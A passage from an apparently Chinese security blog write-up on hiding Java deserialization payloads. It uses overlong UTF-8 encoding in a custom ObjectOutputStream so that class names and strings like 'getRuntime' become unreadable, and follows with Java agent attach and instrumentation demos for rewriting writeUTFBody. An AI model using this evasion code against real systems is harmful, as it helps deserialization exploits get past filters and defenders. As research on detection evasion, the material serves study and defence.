</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="nf">getUTFLength</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0x0001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x0020</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">evil</span><span class="w"> </span><span class="n">evil</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">evil</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fileOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;1obj.bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MyObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MyObjectOutputStream</span><span class="p">(</span><span class="n">fileOut</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">evil</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fileIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;1obj.bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fileIn</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>我们可以看到生成数据流已经没有<code>可打印字符</code>了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">�� sr 	UTF8.evil����4��  xp   //这个是正常生成的可以看到明文类名
</span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241212200422482.png" alt="image-20241212200422482"  />
</p>
<p>然后我看了下网上最开始的方案吧</p>
<p>是设置了一个转换的map，然后将length*2or3，然后直接write的这种形式，现在看感觉可能感觉有点小笨拙hh，但我的poc和这种方式都有一个问题就是都只针对了<code>classname</code>还有属性名和属性值没操作呀！！！我的评价是<strong>imperfect</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xae</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;;&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xbb</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;$&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xa4</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;[&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0x9b</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;]&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0x9d</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa1</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;b&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa2</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;c&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa3</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa4</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa5</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;f&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa6</span><span class="p">});</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241216170214002.png" alt="image-20241216170214002"  />
</p>
<p>可以看到既然还有<code>getRuntime</code>这种字眼！！</p>
<p><img loading="lazy" src="../images/image-20241216170910002.png" alt="image-20241216170910002"  />
</p>
<p>那么就开始我们的perfect之路吧</p>
<p>调试发现在<code>writeString</code>会对<code>属性</code>进行操作</p>
<p><img loading="lazy" src="../images/image-20241216171211857.png" alt="image-20241216171211857"  />
</p>
<p>但是<code>writeString</code>和<code>writeTypeString</code>都不是<code>public</code>呀，我们不能直接重写。</p>
<p>要重写<code>writeString</code>的话要到在一个包里面呀，没错我还真这么干了。。。。但是没成功hh</p>
<p><img loading="lazy" src="../images/image-20241216171630308.png" alt="image-20241216171630308"  />
</p>
<p>我们本地生成个package也是java.io，然后在另一个类调用一次我们的<code>MyObjectOutputStream</code>，目的是生成class文件，在target中找到class文件，关闭相关java应用然后找到这个rt.jar包插入我们class，我把java源码放到src.zip中了方便调试</p>
<p><img loading="lazy" src="../images/image-20241216171944881.png" alt="image-20241216171944881"  />
</p>
<p>执行是成功了，生成的东西看着也没啥毛病，但是反序列化的时候出问题了，但是我不想分析这个了，跟我最初的思路<code>背道而驰</code>了</p>
<p>估计是这个<code>handles</code>的问题，我把这个<code>handles</code>编码相关的都注释了，不然运行不了，因为他也是一个子类的值后面又很麻烦！——！</p>
<p><img loading="lazy" src="../images/image-20241216173022063.png" alt="image-20241216173022063"  />
</p>
<p>看到<code>writeString</code>归根到底，还是调用的<code>writeUTFBody</code>方法，那我都到修改java.io下的包了，为什么不直接修改<code>writeUTFBody</code>里的代码不就行了么？？</p>
<p><img loading="lazy" src="../images/image-20241216173205183.png" alt="image-20241216173205183"  />
</p>
<p>但是我又懒得再操作一篇了hh，因为我看到了这篇文章 <a href="https://xz.aliyun.com/t/14300?time__1311=GqAxuD9QiQDQ0%3DD%2F82cu7Dgm5qGQeeqKa4D#toc-1">用agent操作</a> ，思路是一样就是修改<code>writeUTFBody</code>的代码，文章中是注释了其他if范围限制，都用3byte的形式生成utf-8编码</p>
<h2 id="0x05-agent">0x05 agent<a hidden class="anchor" aria-hidden="true" href="#0x05-agent">#</a></h2>
<p>当然啦对于不会agent的小伙伴来说，会有点困难，笔者这里也不会不然不至于<strong>绕那么多圈子</strong>，那就在这里<strong>突破极限！！</strong></p>
<p>推荐两篇文章，demo构建起来挺顺利的，也有个大概的理解，这里主要用来修改字节码</p>
<ul>
<li>通过 <code>-javaagent</code> 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5)</li>
<li>通过 <code>VirtualMachine.attach()</code> 方法, 将 agent 附加在启动后的 JVM 进程中, 进而动态修改class内容，然后重新加载这个class (自 JDK 1.6)</li>
</ul>
<p><a href="https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0">https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0</a></p>
<p><a href="https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE">https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE</a> //window跟这篇直接idea构造的demo</p>
<p>这里就不再叙述了，记录下构建demo的一些细节的地方</p>
<ol>
<li>依赖可以直接 在库里面添加java来添加jar</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217162908232.png" alt="image-20241217162908232"  />
</p>
<p>或者pom.xml</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.sun<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>tools<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.8.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;systemPath&gt;</span>C:/MyFiles/Tools/ENV/JAVA/jdk1.8.0_74/lib/tools.jar<span class="nt">&lt;/systemPath&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><ol start="2">
<li>-javaagent</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217161152627.png" alt="image-20241217161152627"  />
</p>
<p>这里idea点击<code>修改选项</code>，然后<code>添加虚拟机选项</code>，这时会在test类上方多出一行，这个地方填入我们的javaagent</p>
<ol start="3">
<li>
<blockquote>
<p>其中带有 <code>Instrumentation inst</code> 参数的方法优先级更高, 会优先被调用</p>
</blockquote>
<p>这句话的理解，我实验的结果是，<code>两个premain都存在</code>的时候<code>只</code>执行了<code>inst</code>参数的，当<code>只有args参数的premain</code>的时候会<code>输出 on inset</code></p>
</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217161715785.png" alt="image-20241217161715785"  />
</p>
<h3 id="agentmain-方式">agentmain 方式<a hidden class="anchor" aria-hidden="true" href="#agentmain-方式">#</a></h3>
<p>Demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.Instrumentation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Demo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">agentmain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;agentmain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>MANIFEST.MF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
</span></span><span class="line"><span class="cl">Agent-Class: com.example.Demo
</span></span></code></pre></div><p>然后打包成agent.jar</p>
<p>另一个idea项目下</p>
<p>test用于模拟一直运行的程序</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">InterruptedException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Hello World&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="n">1000</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>jps找到<code>test</code>对应id</p>
<p><img loading="lazy" src="../images/image-20241217174850853.png" alt="image-20241217174850853"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.tools.attach.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.List</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">agent_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AgentLoadException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">AgentInitializationException</span><span class="p">,</span><span class="w"> </span><span class="n">AttachNotSupportedException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">VirtualMachine</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualMachine</span><span class="p">.</span><span class="na">attach</span><span class="p">(</span><span class="s">&#34;21476&#34;</span><span class="p">);</span><span class="w">  </span><span class="c1">// 命令行找到这个jvm的进程号</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">attach</span><span class="p">.</span><span class="na">loadAgent</span><span class="p">(</span><span class="s">&#34;C:\\Users\\jie\\Desktop\\Java\\Learn\\out\\artifacts\\agent_jar\\agent.jar&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">attach</span><span class="p">.</span><span class="na">detach</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;attach ok&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list(); // 得到 JVM 进程列表</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        for (VirtualMachineDescriptor desc : list){ // 遍历</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            String name = desc.displayName(); // 进程名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            String pid = desc.id(); // PID</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            if (name.contains(&#34;test&#34;)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                System.out.println(pid);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                VirtualMachine vm = VirtualMachine.attach(pid);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                vm.loadAgent(&#34;C:\\Users\\jie\\Desktop\\Java\\Learn\\out\\artifacts\\agent_jar\\agent.jar&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                vm.detach();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                System.out.println(&#34;attach ok&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                break;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
